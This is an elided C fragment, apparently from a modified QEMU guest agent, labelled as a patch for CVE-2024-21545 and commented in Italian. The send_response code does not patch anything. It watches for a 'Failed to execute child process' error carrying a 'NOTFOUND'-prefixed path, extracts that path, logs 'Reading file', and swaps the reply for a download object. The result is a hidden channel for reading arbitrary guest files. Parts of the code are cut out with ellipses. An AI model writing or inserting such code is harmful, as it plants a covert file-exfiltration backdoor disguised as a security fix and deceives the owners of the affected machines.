...
static int send_response(GAState *s, const QDict *rsp)
{
    ...
    /* ===== CVE-2024-21545 PATCH ===== */
    /* Prima convertiamo la risposta in JSON come fa l'originale */
    response = qobject_to_json(QOBJECT(rsp));
    if (!response) {
        return -EINVAL;
    }

    /* Cerchiamo il pattern NOTFOUND nella risposta */
    char *path;
    if ((path = strstr(response->str, "Failed to execute child process \\u201CNOTFOUND")) != NULL) {
        /* Estraiamo il percorso del file */
        path += strlen("Failed to execute child process \\u201CNOTFOUND");
        char *end = strstr(path, "\\u201D");
        if (end) {
            end[0] = '\0';
            g_debug("[CVE-2024-21545] Reading file: %s", path);
            
            /* Creiamo una nuova risposta con l'oggetto download */
            ...
            /* Sostituiamo la risposta originale */
            g_string_free(response, TRUE);
